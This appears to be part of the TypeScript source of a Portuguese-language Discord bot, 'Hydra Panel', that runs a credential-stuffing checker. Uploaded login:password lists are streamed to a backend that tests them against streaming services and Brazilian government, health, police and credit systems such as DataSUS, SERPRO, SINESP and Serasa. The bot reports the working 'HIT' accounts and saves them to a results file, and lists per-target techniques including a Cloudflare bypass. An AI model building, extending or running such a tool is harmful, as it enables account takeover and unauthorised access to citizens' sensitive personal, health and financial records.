    console.log(`[ADMIN LOGCHANNEL] ${interaction.user.tag} set log channel to #${channel.id} in guild ${interaction.guildId}`);
    return;
  }
}

// ── Checker streaming helpers ─────────────────────────────────────────────────

interface LiveCheckerResult {
  credential: string;
  login:      string;
  status:     "HIT" | "FAIL" | "ERROR";
  detail:     string;
}

interface LiveCheckerState {
  total:        number;
  index:        number;
  hits:         number;
  fails:        number;
  errors:       number;
  retries:      number;
  recent:       LiveCheckerResult[];
  allResults:   LiveCheckerResult[];
  done:         boolean;
  stopped:      boolean;
  userStopped?: boolean;
  startedAt:    number;
  credsPerMin:  number;
}

interface CheckerHistoryEntry {
  txt:         Buffer;
  fileName:    string;
  targetLabel: string;
  targetIcon:  string;
  ts:          Date;
  hitCount:    number;
  total:       number;
}

// Per-user last check history (in-memory — cleared on restart)
const lastCheckHistory = new Map<string, CheckerHistoryEntry>();

// ── /historico ────────────────────────────────────────────────────────────────
async function handleHistorico(interaction: ChatInputCommandInteraction): Promise<void> {
  const callerId = interaction.user.id;
  const hist     = lastCheckHistory.get(callerId);

  if (!hist) {
    const noHistEmbed = new EmbedBuilder()
      .setColor(COLORS.GOLD)
      .setTitle("📜 Histórico de Checks")
      .setDescription(
        "Nenhum check anterior encontrado para a sua conta nesta sessão.\n\n" +
        "Use `/checker` para iniciar uma verificação — os resultados serão salvos automaticamente.",
      )
      .setFooter({ text: AUTHOR })
      .setTimestamp();
    await interaction.reply({ embeds: [noHistEmbed], flags: MessageFlags.Ephemeral });
    return;
  }

  const elapsed = Math.round((Date.now() - hist.ts.getTime()) / 1000);
  const elStr   = elapsed < 60 ? `${elapsed}s atrás` : elapsed < 3600
    ? `${Math.floor(elapsed / 60)}m${elapsed % 60}s atrás`
    : `${Math.floor(elapsed / 3600)}h${Math.floor((elapsed % 3600) / 60)}m atrás`;

  const histEmbed = new EmbedBuilder()
    .setColor(COLORS.GOLD)
    .setTitle(`📜 Histórico — ${hist.targetIcon} ${hist.targetLabel}`)
    .setDescription(
      `**🗓 Check realizado:** <t:${Math.floor(hist.ts.getTime() / 1000)}:F>\n` +
      `**⏱ Há quanto tempo:** ${elStr}\n\n` +
      `**📦 Total checado:** \`${hist.total}\`\n` +
      `**✅ HITs:** \`${hist.hitCount}\`\n` +
      `**❌ FAILs + Erros:** \`${hist.total - hist.hitCount}\`\n\n` +
      `O arquivo completo com todos os resultados está anexado abaixo.`,
    )
    .setFooter({ text: AUTHOR })
    .setTimestamp(hist.ts);

  const attachment = new AttachmentBuilder(hist.txt, { name: hist.fileName });
  await interaction.reply({ embeds: [histEmbed], files: [attachment], flags: MessageFlags.Ephemeral });
}

function buildProgressBar(done: number, total: number, width = 20): string {
  const pct   = total === 0 ? 0 : Math.round((done / total) * width);
  const filled = "█".repeat(pct);
  const empty  = "░".repeat(width - pct);
  const percent = total === 0 ? 0 : Math.round((done / total) * 100);
  return `\`${filled}${empty}\` **${percent}%**`;
}

/** Returns embeds whose combined character count stays within Discord's 6000-char limit. */
function safeEmbeds(embeds: EmbedBuilder[], budget = 5800): EmbedBuilder[] {
  const result: EmbedBuilder[] = [];
  let total = 0;
  for (const embed of embeds) {
    const d    = embed.toJSON();
    const size = (d.title?.length ?? 0) + (d.description?.length ?? 0) + (d.footer?.text?.length ?? 0) + (d.author?.name?.length ?? 0);
    if (result.length > 0 && total + size > budget) break;
    result.push(embed);
    total += size;
  }
  return result;
}

/** Builds a beautiful, organized .txt file with all checker results. */
function buildCheckerTxt(
  allResults:  LiveCheckerResult[],
  finalState:  LiveCheckerState,
  targetLabel: string,
  targetIcon:  string,
  concurrency: number,
): Buffer {
  const W = 66;
  const pad = (s: string, w: number) => s + " ".repeat(Math.max(0, w - s.length));
  const line = (c: string) => c.repeat(W);
  const row  = (content: string) => `║ ${pad(content, W - 2)} ║`;
  const sep  = (l: string, m: string, r: string, f: string) => l + line(f) + r;

  const now  = new Date();
  const dt   = now.toLocaleDateString("pt-BR") + " às " + now.toLocaleTimeString("pt-BR", { hour: "2-digit", minute: "2-digit", second: "2-digit" });
  const elapsed = Math.round((Date.now() - finalState.startedAt) / 1000);
  const elStr   = elapsed >= 60 ? `${Math.floor(elapsed / 60)}m${elapsed % 60}s` : `${elapsed}s`;
  const speedStr = finalState.credsPerMin > 0 ? `${finalState.credsPerMin} cr/min` : "—";

  const hits   = allResults.filter(r => r.status === "HIT");
  const fails  = allResults.filter(r => r.status === "FAIL");
  const errors = allResults.filter(r => r.status === "ERROR");

  const lines: string[] = [];

  // ── Header box ──────────────────────────────────────────────────────────────
  lines.push(sep("╔", "", "╗", "═"));
  lines.push(row("  HYDRA — CHECKER RESULTADOS"));
  lines.push(sep("╠", "", "╣", "═"));
  lines.push(row(`  Alvo      : ${targetIcon} ${targetLabel}`));
  lines.push(row(`  Data      : ${dt}`));
  lines.push(row(`  Threads   : ${concurrency}x paralelo`));
  lines.push(row(`  Duração   : ${elStr}  |  Velocidade : ${speedStr}`));
  lines.push(sep("╠", "", "╣", "═"));
  lines.push(row(`  Total : ${finalState.total}   ✅ HITS : ${hits.length}   ❌ FAILS : ${fails.length}   ⚠  ERROS : ${errors.length}`));
  lines.push(sep("╚", "", "╝", "═"));
  lines.push("");

  // ── Section helper ───────────────────────────────────────────────────────────
  const section = (title: string) => {
    const dashes = Math.max(0, Math.floor((W - title.length - 2) / 2));
    const left  = "─".repeat(dashes);
    const right = "─".repeat(W - dashes - title.length - 2);
    lines.push(`${left} ${title} ${right}`);
    lines.push("");
  };

  // ── HITS ─────────────────────────────────────────────────────────────────────
  if (hits.length > 0) {
    section(`✅  HITS (${hits.length})`);
    hits.forEach((r, i) => {
      lines.push(`[${String(i + 1).padStart(2, "0")}]  ${r.credential}`);
      lines.push(`      └─ ${r.detail ?? "—"}`);
      lines.push("");
    });
  } else {
    section("✅  HITS (0)");
    lines.push("      Nenhum hit encontrado.");
    lines.push("");
  }

  // ── FAILS ─────────────────────────────────────────────────────────────────────
  const MAX_FAILS = 500;
  if (fails.length > 0) {
    const showFails = fails.slice(0, MAX_FAILS);
    section(`❌  FAILS (${fails.length}${fails.length > MAX_FAILS ? ` — mostrando ${MAX_FAILS}` : ""})`);
    if (fails.length > MAX_FAILS) {
      lines.push(`      ⚠  Lista truncada: exibindo apenas os primeiros ${MAX_FAILS} de ${fails.length} fails.`);
      lines.push("");
    }
    showFails.forEach((r, i) => {
      lines.push(`[${String(i + 1).padStart(2, "0")}]  ${r.credential}`);
      lines.push(`      └─ ${r.detail ?? "invalid_credentials"}`);
      if ((i + 1) % 10 === 0) lines.push("");
    });
    lines.push("");
  }

  // ── ERRORS ────────────────────────────────────────────────────────────────────
  const MAX_ERRORS = 200;
  if (errors.length > 0) {
    const showErrors = errors.slice(0, MAX_ERRORS);
    section(`⚠   ERROS (${errors.length}${errors.length > MAX_ERRORS ? ` — mostrando ${MAX_ERRORS}` : ""})`);
    if (errors.length > MAX_ERRORS) {
      lines.push(`      ⚠  Lista truncada: exibindo apenas os primeiros ${MAX_ERRORS} de ${errors.length} erros.`);
      lines.push("");
    }
    showErrors.forEach((r, i) => {
      lines.push(`[${String(i + 1).padStart(2, "0")}]  ${r.credential}`);
      lines.push(`      └─ ${r.detail ?? "unknown_error"}`);
      if ((i + 1) % 10 === 0) lines.push("");
    });
    lines.push("");
  }

  // ── Footer ───────────────────────────────────────────────────────────────────
  lines.push("═".repeat(W));
  lines.push(`  ${AUTHOR}  •  Hydra Panel`);
  lines.push("═".repeat(W));

  return Buffer.from(lines.join("\n"), "utf-8");
}

/** Builds a compact summary embed shown alongside the .txt result file. */
function buildCheckerSummaryEmbed(
  finalState:  LiveCheckerState,
  targetLabel: string,
  targetIcon:  string,
  concurrency: number,
): EmbedBuilder {
  const hits   = finalState.hits;
  const fails  = finalState.fails;
  const errors = finalState.errors;
  const color  = hits > 0 ? COLORS.GREEN : errors === finalState.total ? COLORS.ORANGE : COLORS.RED;
  const elapsed = Math.round((Date.now() - finalState.startedAt) / 1000);
  const elStr   = elapsed >= 60 ? `${Math.floor(elapsed / 60)}m${elapsed % 60}s` : `${elapsed}s`;
  const speedStr = finalState.credsPerMin > 0 ? `⚡ ${finalState.credsPerMin} cr/min` : "";
  const retryStr = finalState.retries    > 0 ? `🔄 ${finalState.retries} retry` : "";
  const extras   = [speedStr, retryStr].filter(Boolean).join(" • ");

  return new EmbedBuilder()
    .setColor(color)
    .setTitle(`${targetIcon} CHECKER ${targetLabel.toUpperCase()} — CONCLUÍDO`)
    .setDescription(
      `📊 **${finalState.total}** testada${finalState.total === 1 ? "" : "s"}\n\n` +
      `✅ **HITS** — ${hits}\n` +
      `❌ **FAILS** — ${fails}\n` +
      `⚠️ **ERROS** — ${errors}\n\n` +
      `⏱️ Duração: **${elStr}**${extras ? `\n${extras}` : ""}`,
    )
    .setTimestamp()
    .setFooter({ text: `${AUTHOR} • ${concurrency}x paralelo • resultados no arquivo abaixo` });
}

function buildLiveCheckerEmbed(
  state:       LiveCheckerState,
  targetLabel: string,
  targetIcon:  string,
  concurrency: number,
): EmbedBuilder {
  const { total, index, hits, fails, errors, retries, recent, done, stopped, startedAt, credsPerMin } = state;
  const connectionError = (state as LiveCheckerState & { connectionError?: string }).connectionError;

  // ── Title ─────────────────────────────────────────────────────────────────
  const title = stopped
    ? (connectionError ? `⚡ CONEXÃO PERDIDA — ${targetLabel}` : `🛑 CHECKER PARADO — ${targetLabel}`)
    : done
      ? `${targetIcon} CHECKER CONCLUÍDO — ${targetLabel}`
      : `${targetIcon} CHECKER AO VIVO — ${targetLabel}`;

  // ── Progress bar ──────────────────────────────────────────────────────────
  const progressBar = buildProgressBar(done || stopped ? total : index, total);

  // ── Time / speed ──────────────────────────────────────────────────────────
  const elapsed     = Math.round((Date.now() - startedAt) / 1000);
  const elapsedStr  = elapsed >= 60
    ? `${Math.floor(elapsed / 60)}m${elapsed % 60}s`
    : `${elapsed}s`;

  const remaining   = credsPerMin > 0 && !done && !stopped
    ? Math.ceil(((total - index) / credsPerMin) * 60)
    : 0;
  const etaStr      = remaining > 0
    ? remaining >= 60 ? `~${Math.floor(remaining / 60)}m${remaining % 60}s` : `~${remaining}s`
    : "";

  // ── Stats row ─────────────────────────────────────────────────────────────
  const statsLine = [
    `✅ **${hits}** HIT${hits !== 1 ? "s" : ""}`,
    `❌ **${fails}** FAIL`,
    `⚠️ **${errors}** ERRO`,
    retries > 0 ? `🔄 **${retries}** retry` : null,
  ].filter(Boolean).join("  |  ");

  // ── Speed / ETA row ───────────────────────────────────────────────────────
  const metaLine = [
    `⏱ **${elapsedStr}**`,
    credsPerMin > 0 ? `⚡ **${credsPerMin} cr/min**` : null,
    etaStr         ? `🕐 ETA ${etaStr}` : null,
    `🔀 **${concurrency}x paralelo**`,
  ].filter(Boolean).join("  •  ");

  // ── Split hits / fails from allResults ───────────────────────────────────
  const allHits     = state.allResults.filter(r => r.status === "HIT");
  const recentFails = state.allResults.filter(r => r.status !== "HIT").slice(-4);

  const hitLines = allHits.length === 0
    ? (done || stopped ? "*Nenhum hit encontrado.*" : "*Buscando...*")
    : allHits.slice(0, 6).map(r => {
        const cred = r.credential.length > 44 ? r.credential.slice(0, 41) + "…" : r.credential;
        const det  = r.detail?.length > 50    ? r.detail.slice(0, 47)    + "…" : (r.detail ?? "");
        return `> \`${cred}\`${det ? `\n> 📋 ${det}` : ""}`;
      }).join("\n");

  const failLines = recentFails.length === 0
    ? (done || stopped ? "*—*" : "*Aguardando...*")
    : recentFails.map(r => {
        const icon = r.status === "ERROR" ? "⚠️" : "❌";
        const cred = r.credential.length > 40 ? r.credential.slice(0, 37) + "…" : r.credential;
        return `${icon} \`${cred}\``;
      }).join("\n");

  const desc = [
    progressBar,
    `\`${done || stopped ? total : index}/${total}\` concluídas`,
    "",
    statsLine,
    metaLine,
    "",
    `**✅ HITS${allHits.length > 0 ? ` (${allHits.length})` : ""}:**`,
    hitLines,
    "",
    `**❌ FAILs recentes:**`,
    failLines,
  ].join("\n");

  const color = stopped
    ? COLORS.ORANGE
    : done
      ? (hits > 0 ? COLORS.GREEN : errors === total ? COLORS.ORANGE : COLORS.RED)
      : 0xF1C40F;

  const footerStatus = stopped
    ? (connectionError ? `⚡ Queda de conexão — reinicie a checagem` : "🛑 Parado pelo usuário")
    : done ? "✔ Finalizado" : "● Processando...";

  return new EmbedBuilder()
    .setColor(color)
    .setTitle(title)
    .setDescription(desc.slice(0, 2000))
    .setFooter({ text: `${AUTHOR} • ${targetLabel} • ${footerStatus}` })
    .setTimestamp(done || stopped ? new Date() : null);
}

/**
 * Connects to the SSE streaming endpoint and fires onUpdate for every result.
 * Resolves with final state when streaming is done or aborted.
 * Pass an AbortController to support the Stop button.
 */
async function runStreamingChecker(
  credentials:     string[],
  target:          string,
  onUpdate:        (state: LiveCheckerState) => void,
  abortController: AbortController = new AbortController(),
  maxTimeoutMs:    number = credentials.length * 5_000 + 60_000,
): Promise<LiveCheckerState> {
  const state: LiveCheckerState = {
    total: credentials.length, index: 0, hits: 0, fails: 0, errors: 0,
    retries: 0, recent: [], allResults: [], done: false, stopped: false,
    startedAt: Date.now(), credsPerMin: 0,
  };

  // Overall timeout covers BOTH the connection AND the entire streaming read —
  // do NOT clear it early; clear it in the finally block after streaming ends.
  const timeoutMs = maxTimeoutMs;
  const timeoutId = setTimeout(() => abortController.abort("timeout"), timeoutMs);

  let resp: Response;
  try {
    resp = await fetch(`${API_BASE}/api/checker/stream`, {
      method:  "POST",
      headers: { "Content-Type": "application/json" },
      body:    JSON.stringify({ credentials, target }),
      signal:  abortController.signal,
    });
  } catch (err: unknown) {
    clearTimeout(timeoutId);
    // Connection-phase abort: only mark userStopped if the user explicitly clicked Stop
    const reason = abortController.signal.reason as string | undefined;
    if ((err as Error)?.name === "AbortError" && reason === "user_stop") {
      state.stopped     = true;
      state.userStopped = true;
    }
    state.done = true;
    return state;
  }

  if (!resp.ok || !resp.body) {
    clearTimeout(timeoutId);
    throw new Error(`Stream HTTP ${resp.status}`);
  }

  const reader  = resp.body.getReader();
  const decoder = new TextDecoder();
  let   buffer  = "";

  try {
    while (true) {
      const { done, value } = await reader.read();
      if (done) break;

      buffer += decoder.decode(value, { stream: true });
      const events = buffer.split("\n\n");
      buffer = events.pop() ?? "";

      for (const block of events) {
        const line = block.trim();
        if (!line.startsWith("data:")) continue;
        let data: Record<string, unknown>;
        try { data = JSON.parse(line.slice(5).trim()); } catch { continue; }

        if (data.type === "start") {
          state.total = (data.total as number) || state.total;

        } else if (data.type === "result") {
          const r: LiveCheckerResult = {
            credential: data.credential as string,
            login:      data.login      as string,
            status:     data.status     as "HIT" | "FAIL" | "ERROR",
            detail:     data.detail     as string,
          };
          state.index   = data.index   as number;
          state.hits    = data.hits    as number;
          state.fails   = data.fails   as number;
          state.errors  = data.errors  as number;
          state.retries = (data.retries as number) ?? 0;
          state.recent.push(r);
          if (state.recent.length > 8) state.recent.shift();
          state.allResults.push(r);

          const elapsed = Date.now() - state.startedAt;
          state.credsPerMin = elapsed > 0 ? Math.round((state.index / elapsed) * 60_000) : 0;

          onUpdate(state);

        } else if (data.type === "done") {
          state.done        = true;
          state.total       = data.total       as number;
          state.hits        = data.hits        as number;
          state.fails       = data.fails       as number;
          state.errors      = data.errors      as number;
          state.retries     = (data.retries    as number) ?? 0;
          state.credsPerMin = (data.credsPerMin as number) ?? state.credsPerMin;
          onUpdate(state);
        }
      }
    }
  } catch (err: unknown) {
    // Only treat as user-stop if the abort was explicitly triggered by the Stop button
    const reason = abortController.signal.reason as string | undefined;
    if ((err as Error)?.name === "AbortError" && reason === "user_stop") {
      state.stopped     = true;
      state.userStopped = true;
    }
    // Any other error (network drop, timeout, server crash) — NOT userStopped.
    // Keep whatever results accumulated; caller will still send the TXT.
  } finally {
    clearTimeout(timeoutId);
  }

  // Stream ended without a "done" SSE event — server closed connection early.
  // Mark stopped so the embed shows "interrupted", but do NOT set userStopped —
  // the handler must still deliver the TXT with accumulated results.
  if (!state.done && !state.stopped) {
    state.stopped = true;
  }

  state.done = true;
  return state;
}

// ── Checker ───────────────────────────────────────────────────────────────────
async function handleChecker(interaction: ChatInputCommandInteraction): Promise<void> {
  const callerId   = interaction.user.id;
  const callerName = interaction.user.username;
  if (!isOwner(callerId, callerName) && !isMod(callerId, callerName)) {
    await interaction.reply({
      embeds: [buildErrorEmbed("⛔ ACESSO NEGADO", `**${callerName}** — Apenas owners e admins podem usar o checker.\n\n*"Hydra não é dado a quem não tem força para carregá-lo."*`)],
      flags: MessageFlags.Ephemeral,
    });
    return;
  }

  // Defer publicly — message is visible to everyone in the channel
  await interaction.deferReply();
  const sub = interaction.options.getSubcommand();

  // ── Resolve credentials ────────────────────────────────────────────────────
  let credentials: string[] = [];

  if (sub === "single") {
    const cred  = interaction.options.getString("credencial", true).trim();
    // Accept "email:senha" as single string OR separate options
    if (cred.includes(":")) {
      credentials = [cred];
    } else {
      const senha = interaction.options.getString("senha")?.trim() ?? "";
      credentials = senha ? [`${cred}:${senha}`] : [];
    }
  } else if (sub === "multi") {
    const lista = interaction.options.getString("lista", true);
    // Accept newline, comma, semicolon, pipe as separators
    credentials = lista.split(/[\n,;|]+/).map(s => s.trim()).filter(s => s.includes(":"));
  } else if (sub === "arquivo") {
    const att = interaction.options.getAttachment("arquivo", true);
    if (!att.contentType?.includes("text") && !att.name.endsWith(".txt")) {
      await interaction.editReply({ embeds: [buildErrorEmbed("FORMATO INVÁLIDO", "Envie um arquivo `.txt` com uma credencial por linha no formato `login:senha`.")] });
      return;
    }
    if (att.size > 512_000) {
      await interaction.editReply({ embeds: [buildErrorEmbed("ARQUIVO MUITO GRANDE", "Limite: 512 KB por arquivo.")] });
      return;
    }
    try {
      const text = await fetch(att.url).then(r => r.text());
      credentials = text.split(/\r?\n/).map(s => s.trim()).filter(s => s.includes(":"));
    } catch {
      await interaction.editReply({ embeds: [buildErrorEmbed("ERRO", "Não foi possível baixar o arquivo. Tente novamente.")] });
      return;
    }
  }

  if (credentials.length === 0) {
    await interaction.editReply({ embeds: [buildErrorEmbed("SEM CREDENCIAIS", "Nenhuma credencial válida encontrada.\n\nFormatos aceitos: `email:senha`, `usuario:senha`")] });
    return;
  }

  // ── Step 1: Categoria (Streaming vs Logins) ───────────────────────────────
  const prevHistory    = lastCheckHistory.get(callerId);
  const histBtnId      = `chk_history_${Date.now()}`;
  const catComponents  = [
    new ButtonBuilder().setCustomId("chk_cat_streaming").setLabel("🎬 Streaming").setStyle(ButtonStyle.Primary),
    new ButtonBuilder().setCustomId("chk_cat_logins").setLabel("🔑 Logins").setStyle(ButtonStyle.Primary),
    new ButtonBuilder().setCustomId("chk_cancel").setLabel("✖ Cancelar").setStyle(ButtonStyle.Danger),
  ];
  if (prevHistory) {
    catComponents.splice(2, 0,
      new ButtonBuilder().setCustomId(histBtnId).setLabel("📜 Histórico Anterior").setStyle(ButtonStyle.Secondary),
    );
  }
  const catRow = new ActionRowBuilder<ButtonBuilder>().addComponents(catComponents);

  const histDesc = prevHistory
    ? `\n\n> 📜 Histórico salvo: **${prevHistory.targetIcon} ${prevHistory.targetLabel}** — ` +
      `**${prevHistory.hitCount}** hit(s) de ${prevHistory.total} ` +
      `em ${prevHistory.ts.toLocaleDateString("pt-BR")} ${prevHistory.ts.toLocaleTimeString("pt-BR", { hour: "2-digit", minute: "2-digit" })}`
    : "";

  await interaction.editReply({
    embeds: [new EmbedBuilder()
      .setColor(0xF1C40F)
      .setTitle("🎯 CHECKER — SELECIONE A CATEGORIA")
      .setDescription(
        `**${credentials.length}** credencial${credentials.length === 1 ? "" : "is"} pronta${credentials.length === 1 ? "" : "s"} para checar.\n\n` +
        `Escolha o tipo de sistema:` + histDesc,
      )
      .addFields(
        { name: "🎬 Streaming", value: "Crunchyroll · Netflix · Amazon Prime\nHBO Max · Disney+ · Paramount+", inline: true },
        { name: "🔑 Logins",    value: "iSeek · DataSUS · SIPNI · ConsultCenter\nMind-7 · SERPRO · SISREG · CrediLink\nSerasa · SINESP · Serasa Exp. · Instagram\nSISP-ES · SIGMA", inline: true },
      )
      .setFooter({ text: `${AUTHOR} • Expira em 60s` })],
    components: [catRow],
  });

  // ── Await categoria ────────────────────────────────────────────────────────
  let catInteraction: import("discord.js").ButtonInteraction | null = null;
  try {
    const catReply = await interaction.fetchReply();
    catInteraction = await catReply.awaitMessageComponent({
      componentType: ComponentType.Button,
      filter: (b) => b.user.id === callerId && b.customId.startsWith("chk_"),
      time: 60_000,
    });
  } catch {
    await interaction.editReply({ embeds: [buildErrorEmbed("TEMPO ESGOTADO", "Nenhuma categoria selecionada em 60s. Operação cancelada.")], components: [] });
    return;
  }

  // ── Histórico anterior — enviar TXT do último check como ephemeral ─────────
  if (catInteraction.customId === histBtnId) {
    const hist = lastCheckHistory.get(callerId)!;
    await catInteraction.reply({
      embeds: [new EmbedBuilder()
        .setColor(COLORS.GOLD)
        .setTitle(`📜 HISTÓRICO — ${hist.targetIcon} ${hist.targetLabel}`)
        .setDescription(
          `**Data:** ${hist.ts.toLocaleDateString("pt-BR")} às ${hist.ts.toLocaleTimeString("pt-BR")}\n` +
          `**Testadas:** ${hist.total}\n` +
          `**✅ HITs:** ${hist.hitCount}\n\n` +
          `O arquivo completo está anexado abaixo.`,
        )
        .setFooter({ text: AUTHOR })],
      files: [new AttachmentBuilder(hist.txt, { name: hist.fileName })],
      flags: MessageFlags.Ephemeral,
    }).catch(() => void 0);
    // Remove the history button and keep selection open
    await interaction.editReply({ components: [catRow] }).catch(() => void 0);
    // Wait again for category selection
    try {
      const catReply2 = await interaction.fetchReply();
      catInteraction  = await catReply2.awaitMessageComponent({
        componentType: ComponentType.Button,
        filter: (b) => b.user.id === callerId && b.customId.startsWith("chk_"),
        time: 60_000,
      });
    } catch {
      await interaction.editReply({ embeds: [buildErrorEmbed("TEMPO ESGOTADO", "Nenhuma categoria selecionada em 60s.")], components: [] });
      return;
    }
  }

  if (catInteraction.customId === "chk_cancel") {
    await catInteraction.update({ embeds: [buildErrorEmbed("CANCELADO", "Checker cancelado.")], components: [] });
    return;
  }

  // ── Step 2: Alvos da categoria escolhida ──────────────────────────────────
  const isStreaming = catInteraction.customId === "chk_cat_streaming";
  const subRows: ActionRowBuilder<ButtonBuilder>[] = isStreaming
    ? [
        new ActionRowBuilder<ButtonBuilder>().addComponents(
          new ButtonBuilder().setCustomId("chk_crunchyroll").setLabel("🍥 Crunchyroll").setStyle(ButtonStyle.Secondary),
          new ButtonBuilder().setCustomId("chk_netflix").setLabel("🎬 Netflix").setStyle(ButtonStyle.Secondary),
          new ButtonBuilder().setCustomId("chk_amazon").setLabel("📦 Amazon Prime").setStyle(ButtonStyle.Secondary),
          new ButtonBuilder().setCustomId("chk_hbomax").setLabel("👑 HBO Max").setStyle(ButtonStyle.Secondary),
          new ButtonBuilder().setCustomId("chk_disney").setLabel("🏰 Disney+").setStyle(ButtonStyle.Secondary),
        ),
        new ActionRowBuilder<ButtonBuilder>().addComponents(
          new ButtonBuilder().setCustomId("chk_paramount").setLabel("⭐ Paramount+").setStyle(ButtonStyle.Secondary),
          new ButtonBuilder().setCustomId("chk_cancel").setLabel("✖ Cancelar").setStyle(ButtonStyle.Danger),
        ),
      ]
    : [
        new ActionRowBuilder<ButtonBuilder>().addComponents(
          new ButtonBuilder().setCustomId("chk_iseek").setLabel("🌐 iSeek").setStyle(ButtonStyle.Primary),
          new ButtonBuilder().setCustomId("chk_datasus").setLabel("🏥 DataSUS").setStyle(ButtonStyle.Secondary),
          new ButtonBuilder().setCustomId("chk_sipni").setLabel("💉 SIPNI v2").setStyle(ButtonStyle.Secondary),
          new ButtonBuilder().setCustomId("chk_consultcenter").setLabel("📋 ConsultCenter").setStyle(ButtonStyle.Secondary),
          new ButtonBuilder().setCustomId("chk_mind7").setLabel("🧠 Mind-7").setStyle(ButtonStyle.Secondary),
        ),
        new ActionRowBuilder<ButtonBuilder>().addComponents(
          new ButtonBuilder().setCustomId("chk_serpro").setLabel("🛡️ SERPRO").setStyle(ButtonStyle.Secondary),
          new ButtonBuilder().setCustomId("chk_sisreg").setLabel("🏨 SISREG III").setStyle(ButtonStyle.Secondary),
          new ButtonBuilder().setCustomId("chk_credilink").setLabel("💳 CrediLink").setStyle(ButtonStyle.Secondary),
          new ButtonBuilder().setCustomId("chk_serasa").setLabel("📊 Serasa").setStyle(ButtonStyle.Secondary),
          new ButtonBuilder().setCustomId("chk_sinesp").setLabel("🚔 SINESP").setStyle(ButtonStyle.Secondary),
        ),
        new ActionRowBuilder<ButtonBuilder>().addComponents(
          new ButtonBuilder().setCustomId("chk_serasa_exp").setLabel("💼 Serasa Exp.").setStyle(ButtonStyle.Secondary),
          new ButtonBuilder().setCustomId("chk_instagram").setLabel("📸 Instagram").setStyle(ButtonStyle.Secondary),
          new ButtonBuilder().setCustomId("chk_sispes").setLabel("🏛️ SISP-ES").setStyle(ButtonStyle.Secondary),
          new ButtonBuilder().setCustomId("chk_sigma").setLabel("🔵 SIGMA").setStyle(ButtonStyle.Secondary),
          new ButtonBuilder().setCustomId("chk_privacy").setLabel("🔒 Privacy.com.br").setStyle(ButtonStyle.Secondary),
        ),
        new ActionRowBuilder<ButtonBuilder>().addComponents(
          new ButtonBuilder().setCustomId("chk_checkok").setLabel("✅ CheckOK").setStyle(ButtonStyle.Secondary),
          new ButtonBuilder().setCustomId("chk_cancel").setLabel("✖ Cancelar").setStyle(ButtonStyle.Danger),
        ),
      ];

  const subFields: { name: string; value: string; inline: boolean }[] = isStreaming
    ? [
        { name: "🍥 Crunchyroll",  value: "auth.crunchyroll.com — OAuth2 Android", inline: true },
        { name: "🎬 Netflix",      value: "shakti API — BUILD_ID + login",           inline: true },
        { name: "📦 Amazon Prime", value: "amazon.com.br — form scrape",             inline: true },
        { name: "👑 HBO Max",      value: "api.max.com — OAuth2 (Max)",              inline: true },
        { name: "🏰 Disney+",      value: "BAMTech device API — 3-step JWT",         inline: true },
        { name: "⭐ Paramount+",   value: "paramountplus.com — Android REST",        inline: true },
      ]
    : [
        { name: "🌐 iSeek.pro",     value: "iSeek — CSRF + redirect",               inline: true },
        { name: "🏥 DataSUS",       value: "SI-PNI — JSF + SHA-512",                inline: true },
        { name: "💉 SIPNI v2",      value: "SI-PNI — AJAX 4-step (95%)",            inline: true },
        { name: "📋 ConsultCenter", value: "CakePHP login form",                    inline: true },
        { name: "🧠 Mind-7",        value: "mind-7.org + Cloudflare bypass",         inline: true },
        { name: "🛡️ SERPRO",       value: "radar.serpro.gov.br — API Android",      inline: true },
        { name: "🏨 SISREG III",    value: "sisregiii.saude.gov.br — SHA-256",      inline: true },
        { name: "💳 CrediLink",     value: "Credicorp Azure API — JSON token",       inline: true },
        { name: "📊 Serasa",        value: "serasaempreendedor.com.br — curl",      inline: true },
        { name: "🚔 SINESP",        value: "Segurança Pública — OAuth2 Android",    inline: true },
        { name: "💼 Serasa Exp.",   value: "Experience — curl login API",            inline: true },
        { name: "📸 Instagram",     value: "Meta Basic Display API",                 inline: true },
        { name: "🏛️ SISP-ES",      value: "Portal ES — JSF + curl",                inline: true },
        { name: "🔵 SIGMA",         value: "PC-MA — curl form login",               inline: true },
        { name: "🔒 Privacy.com.br", value: "service.privacy.com.br — CPF ou email", inline: true },
        { name: "✅ CheckOK",        value: "bff.checkok.com.br — email ou CPF:pass",  inline: true },
      ];

  await catInteraction.update({
    embeds: [new EmbedBuilder()
      .setColor(isStreaming ? 0x9B59B6 : 0x3498DB)
      .setTitle(isStreaming ? "🎬 STREAMING — SELECIONE O ALVO" : "🔑 LOGINS — SELECIONE O ALVO")
      .setDescription(`**${credentials.length}** credencial${credentials.length === 1 ? "" : "is"} — escolha o alvo:`)
      .addFields(subFields)
      .setFooter({ text: `${AUTHOR} • Expira em 60s` })],
    components: subRows,
  });

  // ── Await alvo específico ─────────────────────────────────────────────────
  const reply = await interaction.fetchReply();
  let btnInteraction: import("discord.js").ButtonInteraction | null = null;
  try {
    btnInteraction = await reply.awaitMessageComponent({
      componentType: ComponentType.Button,
      filter: (b) => b.user.id === callerId && b.customId.startsWith("chk_"),
      time: 60_000,
    });
  } catch {
    await interaction.editReply({ embeds: [buildErrorEmbed("TEMPO ESGOTADO", "Nenhum alvo selecionado em 60s. Operação cancelada.")], components: [] });
    return;
  }

  if (btnInteraction.customId === "chk_cancel") {
    await btnInteraction.update({ embeds: [buildErrorEmbed("CANCELADO", "Checker cancelado.")], components: [] });
    return;
  }

  type CheckerTargetBot = "iseek" | "datasus" | "sipni" | "consultcenter" | "mind7" | "serpro" | "sisreg" | "credilink" | "serasa" | "crunchyroll" | "netflix" | "amazon" | "hbomax" | "disney" | "paramount" | "sinesp" | "serasa_exp" | "instagram" | "sispes" | "sigma" | "privacy" | "checkok";
  const targetMap: Record<string, CheckerTargetBot> = {
    chk_iseek:         "iseek",
    chk_datasus:       "datasus",
    chk_sipni:         "sipni",
    chk_consultcenter: "consultcenter",
    chk_mind7:         "mind7",
    chk_serpro:        "serpro",
    chk_sisreg:        "sisreg",
    chk_credilink:     "credilink",
    chk_serasa:        "serasa",
    chk_crunchyroll:   "crunchyroll",
    chk_netflix:       "netflix",
    chk_amazon:        "amazon",
    chk_hbomax:        "hbomax",
    chk_disney:        "disney",
    chk_paramount:     "paramount",
    chk_sinesp:        "sinesp",
    chk_serasa_exp:    "serasa_exp",
    chk_instagram:     "instagram",
    chk_sispes:        "sispes",
    chk_sigma:         "sigma",
    chk_privacy:       "privacy",
    chk_checkok:       "checkok",
  };
  const target        = targetMap[btnInteraction.customId] ?? "iseek";
  const targetLabel   = {
    iseek: "iSeek.pro", datasus: "DataSUS / SI-PNI", sipni: "SIPNI v2",
    consultcenter: "ConsultCenter", mind7: "Mind-7",
